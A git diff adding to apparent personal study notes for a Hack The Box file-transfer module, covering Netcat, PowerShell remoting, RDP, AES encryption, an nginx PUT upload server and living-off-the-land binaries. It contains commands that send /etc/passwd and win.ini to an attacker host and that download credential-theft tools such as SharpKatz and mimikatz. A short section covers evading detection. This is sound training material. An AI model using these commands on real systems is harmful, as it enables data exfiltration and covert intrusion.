@@ -553,3 +553,434 @@ C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShel
 LordA2117@htb[/htb]$ python3 -m uploadserver # start uploadserver
 LordA2117@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})' # upload using the oneliner
 ```
+
+## Miscellaneous File Transfer Methods
+
+### Netcat
+
+- NC Ona  compromised machine with port 8000:
+
+```bash
+victim@target:~$ # Example using Original Netcat
+victim@target:~$ nc -l -p 8000 > SharpKatz.exe
+victim@target:~$ # Example using Ncat
+victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
+```
+
+- Sending a file to a compromised machine:
+
+```bash
+LordA2117@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+LordA2117@htb[/htb]$ # Example using Original Netcat
+LordA2117@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+LordA2117@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+LordA2117@htb[/htb]$ # Example using Ncat
+LordA2117@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+```
+
+- Sending file as input to NetCat (Attack Host):
+
+```bash
+LordA2117@htb[/htb]$ # Example using Original Netcat
+LordA2117@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+```
+
+- Receiving a file on the compromised machine using NetCat:
+
+```bash
+victim@target:~$ # Example using Original Netcat
+victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
+LordA2117@htb[/htb]$ # Example using Ncat
+LordA2117@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+```
+
+- Using `/dev/tcp` to send and receive files with ncat:
+
+```bash
+victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+```
+
+### Powershell Session File transfers
+
+- To remote on PS, we must have Administrative access, be a part of **Remote Management Users** group, or have explicit permissions.
+- Here, a file transfer is done from `DC01` to `DATABASE01`.
+
+- Check that port 5985 is open on DATABASE01:
+
+```bash
+PS C:\htb> whoami
+htb\administrator
+
+PS C:\htb> hostname
+DC01
+
+PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+ComputerName     : DATABASE01
+RemoteAddress    : 192.168.1.101
+RemotePort       : 5985
+InterfaceAlias   : Ethernet0
+SourceAddress    : 192.168.1.100
+TcpTestSucceeded : True
+```
+
+- Remote a session to DATABASE01:
+
+```bash
+PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
+```
+
+- Send a file from our local session to DATABASE01:
+
+```bash
+PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+```
+
+- Receive a file from DATABASE01:
+
+```bash
+PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+### Remote Desktop Protocol (RDP)
+
+- Mounting a Linux Folder using RDP:
+
+```bash
+LordA2117@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files' # rdesktop
+LordA2117@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer # xfreerdp
+```
+
+- Connect to **\\\tsclient\\**  allowing us to transfer files to and from the RDP session:
+
+![Image Not Found](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/24/tsclient.jpg)
+
+- You can also use *mstsc.exe*:
+
+![Image Not Found](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/24/rdp.png)
+
+After selecting the drive, we can interact with it in the remote session that follows.
+
+> Note: This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.
+
+### Some places where this is handy
+
+- `Active Directory Enumeration and Attacks` - Skills Assessments 1 & 2
+- Throughout the `Pivoting, Tunnelling & Port Forwarding` module
+- Throughout the `Attacking Enterprise Networks` module
+- Throughout the `Shells & Payloads` module
+
+## Protected File Transfers
+
+- It is sometimes necessary to perform file transfers between the target system and attacker machiine with encryption, i.e, the file being transferred must be encrypted.
+
+### File Encryption on Windows
+
+- Invoke-AESEncryption.ps1
+
+```bash
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 
+
+Description
+-----------
+Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
+ 
+Description
+-----------
+Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
+ 
+Description
+-----------
+Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
+ 
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
+ 
+Description
+-----------
+Decrypts the file "file.bin.aes" and outputs the decrypted file "file.bin"
+#>
+function Invoke-AESEncryption {
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('Encrypt', 'Decrypt')]
+        [String]$Mode,
+
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+        [String]$Text,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+        [String]$Path
+    )
+
+    Begin {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+    }
+
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+        switch ($Mode) {
+            'Encrypt' {
+                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + ".aes"
+                }
+
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File encrypted to $outPath"
+                }
+            }
+
+            'Decrypt' {
+                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName -replace ".aes"
+                }
+
+                $aesManaged.IV = $cipherBytes[0..15]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File decrypted to $outPath"
+                }
+            }
+        }
+    }
+
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+```
+
+- Import Invoke-AESEncryption.ps1:
+
+```bash
+PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1
+```
+
+- Encrypt a File:
+
+```bash
+PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
+File encrypted to C:\htb\scan-results.txt.aes
+
+PS C:\htb> ls
+
+    Directory: C:\htb
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/18/2020  12:17 AM           9734 Invoke-AESEncryption.ps1
+-a----        11/18/2020  12:19 PM           1724 scan-results.txt
+-a----        11/18/2020  12:20 PM           3448 scan-results.txt.aes
+```
+
+### File encryption on Linux
+
+- Encrypting with OpenSSL:
+
+```bash
+LordA2117@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+```
+
+- Decrypt passwd.enc with OpenSSL:
+
+```bash
+LordA2117@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+```
+
+## Catching files using HTTP/S
+
+- Web transfer is commonly used because it is commonly allowed through the firewall
+
+
+### NGINX enabling PUT
+
+- Nginx is preferred over apache because its configuration is less complicated and its module system doesn't lead to as many security issues as Apache.
+
+```bash
+LordA2117@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory # Create the dir for uploaded files
+LordA2117@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory # Change the owner to www-data
+```
+
+- Create the nginx configuration file:
+
+```bash
+LordA2117@htb[~]$ touch /etc/nginx/sites-available/upload.conf # create the nginx configuration file
+```
+
+- Contents of nginx config file:
+
+```bash
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+```
+
+- Setting up the site:
+
+```bash
+LordA2117@htb[/htb]$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/ # Symlink the site to sites-enabled directory
+LordA2117@htb[/htb]$ sudo systemctl restart nginx.service # start nginx
+LordA2117@htb[/htb]$ sudo rm /etc/nginx/sites-enabled/default # Remove the default config (in case of any errors)
+```
+
+Check `/var/log/nginx/error.log`
+
+- Upload a file using cURL:
+
+```bash
+LordA2117@htb[/htb]$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+```
+
+## Living Off The Land
+
+- Coined by [Christopher Campbell @obscuresec](https://twitter.com/obscuresec) and [Matt Graeber](https://twitter.com/obscuresec) at [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw)
+- Currently there are 2 major aggregators for LOLBins (Living Off the Land BINaries):
+    - [GTFOBins](https://gtfobins.org/): For Linux
+    - [LOLBAS](https://lolbas-project.github.io/): For Windows
+
+### Using GTFOBins and LOLBAS
+
+#### LOLBAS
+
+- We can search for download or upload functions using `/download` or `/upload`.
+- Here let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/).
+- Upload win.ini to pwnbox:
+
+```bash
+C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
+```
+
+- Receive in pwnbox:
+
+```bash
+LordA2117@htb[/htb]$ sudo nc -lvnp 8000
+```
+
+- In case there is an error, chance are that the version of certreq installed doesn't have the `-Post` parameter. Use [this](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) to get an updated version.
+
+
+#### GTFOBins
+
+- Use `+file upload` or `+file download` to search for binaries.
+- Here we'll use *OpenSSL*.
+
+- Create Certificate and start server in pwnbox:
+
+```bash
+LordA2117@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+LordA2117@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+```
+
+- Download tool on the victim machine:
+
+```bash
+LordA2117@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
+
+### Other Common Living Off the Land Tools
+
+- Bitsadmin Download function: The Background Intelligent Transfer Service (BITS) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.
+
+```bash
+PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+```
+
+- Powershell enables interaction with BITS as follows:
+
+```bash
+PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+
+- Certutil Download:
+
+```bash
+C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+```
+
+> NOTE: Modern Windows Antiviruses flag file download with certutil as malicious.
+
+## Detection
+
+Check module... it's all theory
+
+## Evading Detection
+
+- Changing user agent In Invoke-WebRequest:
+
+Listing out user agents
+
+```bash
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+```
+
+Request with Chrome User Agent:
+
+```bash
+PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+
+### LOLBAS / GTFOBins
+
+- File transfer with GfxDownloadWrapper.exe:
+
+```bash
+PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
